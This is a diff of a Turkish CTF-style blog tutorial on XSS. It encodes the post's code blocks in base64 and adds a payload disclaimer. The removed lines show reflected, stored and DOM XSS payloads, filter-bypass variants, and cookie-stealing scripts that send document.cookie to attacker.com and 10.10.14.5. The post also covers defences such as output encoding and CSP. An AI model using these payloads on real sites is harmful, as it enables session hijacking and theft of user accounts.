@@ -5,6 +5,8 @@ description: "Reflected, Stored ve DOM tabanlı XSS türlerini, bypass teknikler
 tags: ["Web Güvenliği", "CTF"]
 ---
 
+<PayloadDisclaimer />
+
 ## XSS Nedir?
 
 Cross-Site Scripting (XSS), kullanıcıdan gelen verinin doğrudan HTML çıktısına yansıtılmasıyla oluşur. Tarayıcı bu veriyi JavaScript olarak çalıştırır. Sonuç: oturum çalma, keylogger, phishing veya tam tarayıcı kontrolü.
@@ -17,72 +19,27 @@ Cross-Site Scripting (XSS), kullanıcıdan gelen verinin doğrudan HTML çıktı
 
 Payload URL parametresinde taşınır, sunucu bunu olduğu gibi sayfaya yansıtır. Kalıcı değildir — kurbanın özel bir linke tıklaması gerekir.
 
-```
-https://hedef.com/search?q=<script>alert(1)</script>
-```
+<EncodedCodeBlock language="text" data="aHR0cHM6Ly9oZWRlZi5jb20vc2VhcmNoP3E9PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" />
 
 ### 2. Stored XSS
 
 Payload veritabanına kaydedilir, her sayfa yüklenişinde çalışır. En tehlikeli türdür — yorum kutuları, forum mesajları, profil alanları yaygın hedeflerdir.
 
-```html
-<!-- Yorum kutusuna girildiğinde sunucuya kaydedilir -->
-<script>fetch('https://attacker.com/?c='+document.cookie)</script>
-```
+<EncodedCodeBlock language="html" data="PCEtLSBZb3J1bSBrdXR1c3VuYSBnaXJpbGRpxJ9pbmRlIHN1bnVjdXlhIGtheWRlZGlsaXIgLS0+CjxzY3JpcHQ+ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tLz9jPScrZG9jdW1lbnQuY29va2llKTwvc2NyaXB0Pg==" />
 
 ### 3. DOM-Based XSS
 
 Sunucu hiç devreye girmez. JavaScript, URL'deki veriyi okuyup DOM'a yazarken açık oluşur.
 
-```javascript
-// Savunmasız kod
-document.getElementById("output").innerHTML = location.hash.slice(1);
-
-// Sömürü: URL'e ekle
-https://hedef.com/page#<img src=x onerror=alert(1)>
-```
+<EncodedCodeBlock language="javascript" data="Ly8gU2F2dW5tYXPEsXoga29kCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJvdXRwdXQiKS5pbm5lckhUTUwgPSBsb2NhdGlvbi5oYXNoLnNsaWNlKDEpOwoKLy8gU8O2bcO8csO8OiBVUkwnZSBla2xlCmh0dHBzOi8vaGVkZWYuY29tL3BhZ2UjPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==" />
 
 ## Temel Payload'lar
 
-```html
-<!-- Klasik test -->
-<script>alert(1)</script>
-<script>alert(document.domain)</script>
-
-<!-- Script tag engelliyse alternatifler -->
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<body onload=alert(1)>
-<iframe onload=alert(1)>
-<input autofocus onfocus=alert(1)>
-
-<!-- Tırnak karakteri filtreliyse -->
-<script>alert`1`</script>
-<svg/onload=alert(1)>
-```
+<EncodedCodeBlock language="html" data="PCEtLSBLbGFzaWsgdGVzdCAtLT4KPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo8c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4KCjwhLS0gU2NyaXB0IHRhZyBlbmdlbGxpeXNlIGFsdGVybmF0aWZsZXIgLS0+CjxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgxKT4KPHN2ZyBvbmxvYWQ9YWxlcnQoMSk+Cjxib2R5IG9ubG9hZD1hbGVydCgxKT4KPGlmcmFtZSBvbmxvYWQ9YWxlcnQoMSk+CjxpbnB1dCBhdXRvZm9jdXMgb25mb2N1cz1hbGVydCgxKT4KCjwhLS0gVMSxcm5hayBrYXJha3RlcmkgZmlsdHJlbGl5c2UgLS0+CjxzY3JpcHQ+YWxlcnRgMWA8L3NjcmlwdD4KPHN2Zy9vbmxvYWQ9YWxlcnQoMSk+" />
 
 ## Filter Bypass Teknikleri
 
-```html
-<!-- Büyük/küçük harf karışımı -->
-<ScRiPt>alert(1)</ScRiPt>
-<IMG SRC=x OnErRoR=alert(1)>
-
-<!-- Kodlama -->
-<script>alert('\x61\x6c\x65\x72\x74\x281\x29')</script>
-&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
-
-<!-- Boşluk alternatifleri -->
-<img/src=x/onerror=alert(1)>
-<img	src=x onerror=alert(1)>   <!-- tab karakteri -->
-
-<!-- Protokol manipülasyonu -->
-<a href="javascript:alert(1)">tıkla</a>
-<a href="JaVaScRiPt:alert(1)">tıkla</a>
-
-<!-- Double encoding -->
-%253Cscript%253Ealert(1)%253C%252Fscript%253E
-```
+<EncodedCodeBlock language="html" data="PCEtLSBCw7x5w7xrL2vDvMOnw7xrIGhhcmYga2FyxLHFn8SxbcSxIC0tPgo8U2NSaVB0PmFsZXJ0KDEpPC9TY1JpUHQ+CjxJTUcgU1JDPXggT25FclJvUj1hbGVydCgxKT4KCjwhLS0gS29kbGFtYSAtLT4KPHNjcmlwdD5hbGVydCgnXHg2MVx4NmNceDY1XHg3Mlx4NzRceDI4MVx4MjknKTwvc2NyaXB0PgomI3gzQztzY3JpcHQmI3gzRTthbGVydCgxKSYjeDNDOy9zY3JpcHQmI3gzRTsKCjwhLS0gQm/Fn2x1ayBhbHRlcm5hdGlmbGVyaSAtLT4KPGltZy9zcmM9eC9vbmVycm9yPWFsZXJ0KDEpPgo8aW1nCXNyYz14IG9uZXJyb3I9YWxlcnQoMSk+ICAgPCEtLSB0YWIga2FyYWt0ZXJpIC0tPgoKPCEtLSBQcm90b2tvbCBtYW5pcMO8bGFzeW9udSAtLT4KPGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgxKSI+dMSxa2xhPC9hPgo8YSBocmVmPSJKYVZhU2NSaVB0OmFsZXJ0KDEpIj50xLFrbGE8L2E+Cgo8IS0tIERvdWJsZSBlbmNvZGluZyAtLT4KJTI1M0NzY3JpcHQlMjUzRWFsZXJ0KDEpJTI1M0MlMjUyRnNjcmlwdCUyNTNF" />
 
 ## Gerçek Saldırı: Cookie Çalma
 
@@ -110,13 +67,7 @@ app.run(host='0.0.0.0', port=80)
 
 XSS payload'ı:
 
-```javascript
-// Tek satır — yorum kutusuna yapıştır
-<script>new Image().src='http://10.10.14.5/?c='+encodeURIComponent(document.cookie)</script>
-
-// Daha gizli — fetch API ile
-<script>fetch('http://10.10.14.5/?c='+btoa(document.cookie))</script>
-```
+<EncodedCodeBlock language="javascript" data="Ly8gVGVrIHNhdMSxciDigJQgeW9ydW0ga3V0dXN1bmEgeWFwxLHFn3TEsXIKPHNjcmlwdD5uZXcgSW1hZ2UoKS5zcmM9J2h0dHA6Ly8xMC4xMC4xNC41Lz9jPScrZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4KCi8vIERhaGEgZ2l6bGkg4oCUIGZldGNoIEFQSSBpbGUKPHNjcmlwdD5mZXRjaCgnaHR0cDovLzEwLjEwLjE0LjUvP2M9JytidG9hKGRvY3VtZW50LmNvb2tpZSkpPC9zY3JpcHQ+" />
 
 ## BeEF ile Tarayıcı Kontrolü
 
@@ -143,40 +94,11 @@ Hook bağlandıktan sonra BeEF panelinden:
 
 ## DOM XSS — Tehlikeli Sink'ler
 
-```javascript
-// Bu fonksiyonlara kullanıcı verisi geliyorsa XSS riski var
-element.innerHTML = userInput;          // ❌
-element.outerHTML = userInput;          // ❌
-document.write(userInput);             // ❌
-eval(userInput);                       // ❌
-setTimeout(userInput, 100);            // ❌
-location.href = userInput;             // ❌ (javascript: protokolü)
-
-// Güvenli alternatifler
-element.textContent = userInput;       // ✅
-element.setAttribute('value', input);  // ✅ (event handler değilse)
-```
+<EncodedCodeBlock language="javascript" data="Ly8gQnUgZm9ua3NpeW9ubGFyYSBrdWxsYW7EsWPEsSB2ZXJpc2kgZ2VsaXlvcnNhIFhTUyByaXNraSB2YXIKZWxlbWVudC5pbm5lckhUTUwgPSB1c2VySW5wdXQ7ICAgICAgICAgIC8vIOKdjAplbGVtZW50Lm91dGVySFRNTCA9IHVzZXJJbnB1dDsgICAgICAgICAgLy8g4p2MCmRvY3VtZW50LndyaXRlKHVzZXJJbnB1dCk7ICAgICAgICAgICAgIC8vIOKdjApldmFsKHVzZXJJbnB1dCk7ICAgICAgICAgICAgICAgICAgICAgICAvLyDinYwKc2V0VGltZW91dCh1c2VySW5wdXQsIDEwMCk7ICAgICAgICAgICAgLy8g4p2MCmxvY2F0aW9uLmhyZWYgPSB1c2VySW5wdXQ7ICAgICAgICAgICAgIC8vIOKdjCAoamF2YXNjcmlwdDogcHJvdG9rb2zDvCkKCi8vIEfDvHZlbmxpIGFsdGVybmF0aWZsZXIKZWxlbWVudC50ZXh0Q29udGVudCA9IHVzZXJJbnB1dDsgICAgICAgLy8g4pyFCmVsZW1lbnQuc2V0QXR0cmlidXRlKCd2YWx1ZScsIGlucHV0KTsgIC8vIOKchSAoZXZlbnQgaGFuZGxlciBkZcSfaWxzZSk=" />
 
 ## Savunma
 
-```javascript
-// ❌ Tehlikeli
-element.innerHTML = req.query.name;
-
-// ✅ Encode et
-function htmlEncode(str) {
-  return str
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;')
-    .replace(/'/g, '&#x27;');
-}
-element.innerHTML = htmlEncode(req.query.name);
-
-// ✅ Daha iyisi — textContent kullan
-element.textContent = req.query.name;
-```
+<EncodedCodeBlock language="javascript" data="Ly8g4p2MIFRlaGxpa2VsaQplbGVtZW50LmlubmVySFRNTCA9IHJlcS5xdWVyeS5uYW1lOwoKLy8g4pyFIEVuY29kZSBldApmdW5jdGlvbiBodG1sRW5jb2RlKHN0cikgewogIHJldHVybiBzdHIKICAgIC5yZXBsYWNlKC8mL2csICcmYW1wOycpCiAgICAucmVwbGFjZSgvPC9nLCAnJmx0OycpCiAgICAucmVwbGFjZSgvPi9nLCAnJmd0OycpCiAgICAucmVwbGFjZSgvIi9nLCAnJnF1b3Q7JykKICAgIC5yZXBsYWNlKC8nL2csICcmI3gyNzsnKTsKfQplbGVtZW50LmlubmVySFRNTCA9IGh0bWxFbmNvZGUocmVxLnF1ZXJ5Lm5hbWUpOwoKLy8g4pyFIERhaGEgaXlpc2kg4oCUIHRleHRDb250ZW50IGt1bGxhbgplbGVtZW50LnRleHRDb250ZW50ID0gcmVxLnF1ZXJ5Lm5hbWU7" />
 
 ```http
 # Content Security Policy ile script kaynağı kısıtla
@@ -185,13 +107,6 @@ Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'
 
 ## CTF'te XSS Hızlı Kontrol Listesi
 
-```
-1. Her input alanına <script>alert(1)</script> dene
-2. Yansıma nerede? HTML içi / attribute / JavaScript?
-3. Hangi karakterler filtreleniyor? < > " ' /
-4. Encoding denendi mi? URL / HTML / Unicode
-5. CSP var mı? (F12 → Network → Response Headers)
-6. DOM kaynaklarını tara: location.* / document.referrer
-```
+<EncodedCodeBlock language="text" data="MS4gSGVyIGlucHV0IGFsYW7EsW5hIDxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4gZGVuZQoyLiBZYW5zxLFtYSBuZXJlZGU/IEhUTUwgacOnaSAvIGF0dHJpYnV0ZSAvIEphdmFTY3JpcHQ/CjMuIEhhbmdpIGthcmFrdGVybGVyIGZpbHRyZWxlbml5b3I/IDwgPiAiICcgLwo0LiBFbmNvZGluZyBkZW5lbmRpIG1pPyBVUkwgLyBIVE1MIC8gVW5pY29kZQo1LiBDU1AgdmFyIG3EsT8gKEYxMiDihpIgTmV0d29yayDihpIgUmVzcG9uc2UgSGVhZGVycykKNi4gRE9NIGtheW5ha2xhcsSxbsSxIHRhcmE6IGxvY2F0aW9uLiogLyBkb2N1bWVudC5yZWZlcnJlcg==" />
 
 Bir sonraki yazıda **SSRF (Server-Side Request Forgery)** ve iç ağ erişim tekniklerini ele alacağım.
